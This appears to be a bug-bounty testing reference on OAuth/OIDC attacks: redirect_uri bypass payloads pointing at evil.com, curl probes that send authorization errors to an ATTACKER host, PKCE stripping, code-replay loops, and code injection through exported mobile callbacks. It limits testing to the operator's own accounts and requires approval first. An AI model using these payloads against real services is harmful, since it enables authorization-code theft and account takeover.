# OAuth / OIDC: redirect_uri, response_type, PKCE, code & token replay

## Contents
- Invariants (each is an attack when missing)
- Method
- D — `redirect_uri` bypass ladder (code theft -> ATO)
- E — response_type / response_mode downgrade
- F — PKCE downgrade / strip
- G — code / token replay, expiry, client binding
- H — code injection / forced login (incl. the exported-callback mobile variant)
- Good evidence
- Stop conditions / ladder discipline

Use for OAuth2/OIDC authorization-code misuse, token exchange, callback, bridge
token, PKCE, `redirect_uri`, `state`, `nonce`, and refresh/credential conversion
bugs. The finding is **a stolen authorization code/token exchanged for a working
session** (ATO) or **a credential minted with real scopes** — not "the redirect
reflected my domain." Climb the safe-ladder to the exchanged token, using your
own OAuth client and an operator-controlled callback as the exfil endpoint.

## Invariants (each is an attack when missing)

- authorization codes are single-use, short-lived, and expiry is checked at
  exchange time;
- code is bound to client, exact `redirect_uri`, user/session, `state`, PKCE
  verifier, and grant type;
- `redirect_uri` is matched exactly against a registered value (no prefix/subdir/
  subdomain/`@`/`#`/`\` slack);
- access/refresh/bridge tokens are scope- and client-bound and expire;
- `state` is present, unguessable, and validated (CSRF binding).

## Method

1. Register or use an **operator-controlled** OAuth client + redirect/callback you
   host (your exfil endpoint). Complete one normal flow; capture code/token
   metadata (expiry, scopes, client binding).
2. Attack `redirect_uri` (ladder D). If the code lands on a host you control,
   you've proven code theft — exchange it for a token to prove ATO.
3. Attack `response_type`/`response_mode` (ladder E) and PKCE (ladder F).
4. Attack code/token lifecycle: replay, expiry, cross-client (ladder G).
5. Confirm server-side: the exchanged token must return the victim's protected
   data (`/userinfo`, `/api/me`) — a redirect alone is rung 0.

## D — `redirect_uri` bypass ladder (code theft -> ATO)

Registered value is `https://app.target.com/callback`. Try, in order, and watch
where the `code` is delivered:

```
https://app.target.com/callback/../evil            (path traversal/normalization)
https://app.target.com/callback/../../oauth/evil
https://app.target.com.evil.com/callback           (suffix host)
https://app.target.com@evil.com/callback           (userinfo host confusion)
https://evil.com#@app.target.com/callback          (fragment host confusion)
https://evil.com\@app.target.com/callback          (backslash parser split)
https://app.target.com/callback%2f@evil.com
https://app.target.com/callback?next=https://evil.com   (open-redirect param)
https://localhost.evil.com/callback  /  http://127.0.0.1/callback
https://app.target.com/callbackevil.com            (missing-slash prefix match)
```

Two win conditions:
- **direct** — a non-target host in `redirect_uri` is accepted and the `code`
  arrives at your callback. Exchange it -> ATO.
- **chained** — only exact-host `redirect_uri` is accepted, but an **open
  redirect on that host** (or a `next=`/`returnUrl=` param that survives to the
  callback) forwards `code`/`token` off-domain. Compose:
  `redirect_uri=https://app.target.com/openredir?to=https://evil.com`. The code
  lands on `app.target.com`, the open redirect bounces it (with the `?code=` or
  `#access_token=`) to you. This is the standard way an "open redirect" converts.

**Test `redirect_uri` validation WITHOUT completing a login — the error path delivers to
it too.** You do not need credentials, a session, or a valid client secret: force the
authorization endpoint to fail *after* it has parsed `redirect_uri`, and a permissive
server sends the error to your host. Two probes, both single unauthenticated `GET`s:

```bash
# a response_type the client is not allowed to use
curl -si "$AUTHZ?client_id=$CID&redirect_uri=https://ATTACKER/&response_type=token&scope=openid" | grep -i '^location'
# -> Location: https://ATTACKER/#error=unauthorized_client&error_description=...  == NOT validated

# no session + prompt=none -> immediate "login_required" error, delivered to the redirect
curl -si "$AUTHZ?client_id=$CID&redirect_uri=https://ATTACKER/&response_type=code&scope=openid&prompt=none" | grep -i '^location'
# -> Location: https://ATTACKER/?error=login_required&iss=...
```

A conforming server refuses to redirect to an unregistered URI and renders the error on
its **own** page instead — that is the negative control, and it is what the response looks
like when validation is present. Run both against a client you know is correctly
configured, in the same batch, before writing any verdict.

This is the cheapest possible first probe on any Keycloak/Auth0/Okta/Ping deployment: it
tells you whether the ladder below is worth walking, and it fires before authentication.
Note that a redirect carrying only `error=` is still just an open redirect — the ladder
below is how it becomes code theft, and unchained it converts poorly or not at all.

Also test **path/subdomain** slack: any `*.target.com` accepted lets an XSS or a
takeover on a sibling subdomain steal the code.

## E — response_type / response_mode downgrade

- **Implicit downgrade**: force `response_type=token` (or `token id_token`) so the
  credential comes back in the URL **fragment** — fragments leak via Referer,
  history, and open redirects far more easily than a one-time code.
- **Mixed**: `response_type=code%20token%20id_token` — some servers issue both;
  the token in the fragment is stealable even if the code is PKCE-protected.
- **response_mode**: switch `form_post` -> `query`/`fragment` to move the secret
  into a loggable/leakable location.
- **`prompt=none`** with a valid session silently re-issues a code — combine with
  a redirect_uri bypass for zero-click theft.

## F — PKCE downgrade / strip

- **Strip**: omit `code_challenge` at `/authorize`; if `/token` then accepts an
  exchange **without** `code_verifier`, PKCE is not enforced -> a stolen code is
  exchangeable by anyone (defeats the whole point of PKCE on public clients).
- **Downgrade**: send `code_challenge_method=plain` (or omit it) where the app
  expects `S256`; if accepted, the `code_challenge` is guessable/replayable.
- **Verifier not bound**: exchange the code with a *different* `code_verifier`
  than the challenge implies, or an empty one; success = binding broken.
- **Cross-flow**: start a PKCE flow, then exchange the code on a non-PKCE token
  route or older API version that skips the check.

## G — code / token replay, expiry, client binding

```bash
# replay: exchange the same code twice
for i in 1 2; do
 curl -s -X POST https://target/oauth/token -d grant_type=authorization_code \
   -d code=$CODE -d redirect_uri=$RU -d client_id=$CID -d client_secret=$CSEC ; echo
done   # two valid tokens = code not consumed (High)
```

- **Expiry not checked** — wait past the documented code TTL, then exchange;
  accepted = expiry bug. (Waiting real expiry is safe; do not brute-force.)
- **Wrong client** — exchange the code with a *different* registered `client_id`
  (or none). Success = code not client-bound.
- **`redirect_uri` mismatch at exchange** — the exchange must re-check the same
  `redirect_uri` used at `/authorize`; if it doesn't, code theft is easier.
- **Bridge/session-exchange tokens** — an app-specific token (`bridge`, `st`,
  `session_token`) that mints downstream credentials for the *original* identity:
  replay it; if it re-mints, that's a credential-minting High/Critical.
- **Refresh token** — scope creep on refresh (the new access token carries scopes
  the original grant did not) is exchanged here. Whether the refresh token
  *survives* a logout / password change / revoke is owned by
  `session-lifecycle.md` §E.
- **`state`** — missing or unvalidated `state` -> login CSRF / code-injection
  (attacker's code forced into victim's session = account linking takeover);
  reproduce with your two accounts. **The full chain, the mobile delivery vector
  and the impact framing that keeps it out of the informative pile are in §H.**

## H — code injection / forced login: the attack that runs *backwards*

§D through §G all steal the victim's code. This one **gives** them yours, and it
is skipped constantly because the first reaction is "so the victim is logged into
my account, who cares". Care: from that moment every action they take is written
into **your** account, where you read it through the normal web flow. It is a data
*ingestion* attack, not exfiltration, and that reframing is what moves it out of
the informative pile.

### The invariant

A callback that consumes an `authorization_code` **without validating `state`, and
without PKCE**, cannot tell whose authorization it is completing. Deliver a code
minted for an account you control and the client exchanges it and swaps its stored
tokens for yours.

### The mobile variant — an exported callback activity is a remote entry point

The web version needs a login-CSRF delivery. The mobile version does not, and no
other file in this pack covers it:

- the app registers its OAuth callback on a **custom URI scheme** and marks the
  activity `android:exported="true"` (or ships an iOS URL type), so *anything*
  can invoke it — a web link, a QR code, a chat message, another installed app;
- the activity takes `code` straight off the incoming intent and exchanges it;
- **check the client credentials in the package.** A "public" mobile client with a
  `client_secret` shipped as a string resource is not a public client; if the token
  endpoint accepts that secret as authoritative client authentication, you can mint
  codes yourself. Pull it with `jadx` / `apktool` (installed, not on PATH — call
  them by absolute path, `../../_shared/references/tooling.md`).
- **probe the token endpoint's shape too**: one that accepts `GET` with the secret
  in the query string is non-conformant (RFC 6749 §3.2) and is its own finding line
  in the report — the secret ends up in logs, history and referers.

Recognition, in order, all static: the manifest / `Info.plist` for an exported
callback bound to a scheme → the string resources for a client secret → the
authorize request for a `state` that is absent, constant, or never checked on
return → the absence of `code_challenge`.

### Why it persists, which is half the severity

Read the token lifetime before writing the report. A **non-rotating refresh
token** plus a silent swap means the victim stays authenticated as you until they
explicitly sign out — and there is no UI cue prompting them to, because nothing
visibly changed. State that plainly: the window is not the access-token lifetime,
it is "until an action the victim has no reason to take".

### Proof, on your own accounts only

1. Mint a code for **your own** second account through the normal flow and stop
   before redemption.
2. Deliver it to **your own** first account's client — the deep link, or the
   login-CSRF for web.
3. Show the swap: the client's stored token now carries your second account's
   subject. Decode it; do not rely on a UI label.
4. Take one benign action in the victim client and read it back from the attacker
   account through the normal web flow. **That read is the finding** — it is what
   proves ingestion rather than a cosmetic session mix-up.
5. Never deliver a code to a real user's device. That is rung 5 — return
   d0x's approval before execution with the exact link.

**Converts:** High when the victim's subsequent actions carry real content into
the attacker's account (submissions, saved records, enrolments, uploads); Medium
when the client's post-login surface is read-only. A silent swap plus a
non-rotating refresh token argues the top of that range.

**Corpus case:** `aaeab6f5a49d406b8c99d851124abbe6` —
`bugcrowd/reports/aaeab6f5a49d406b8c99d851124abbe6-one-click-oauth-code-injection-via-exported-authactivit.md`
(P2 · exported callback, no `state`, no PKCE, client secret in the package).

## Good evidence

- code delivered to an operator-controlled host (redirect_uri bypass), then
  exchanged -> `/userinfo` returns the identity = ATO;
- same code exchanged twice returning two valid tokens;
- token exchange succeeds with wrong client / no PKCE verifier / expired code;
- open-redirect-on-allowed-host forwards `code`/`#access_token` off-domain;
- bridge token re-mints downstream credentials on replay;
- negative control: the canonical exact-`redirect_uri` flow enforces.

## Stop conditions / ladder discipline

- Use only **your own** OAuth client, code, token, and callback. Never capture a
  real third party's code/token; the exfil endpoint must be operator-controlled.
- Exchanging *your own* code to prove replay/expiry/PKCE is read-only own-context
  — do it. Reaching a *real* user's session on prod = ask d0x directly before executing; prove ATO with
  your two accounts or on UAT instead.
- Flag any minted token for rotation in the lead file under
  `targets/<program>/leads/` (`../../_shared/references/output-contract.md`).
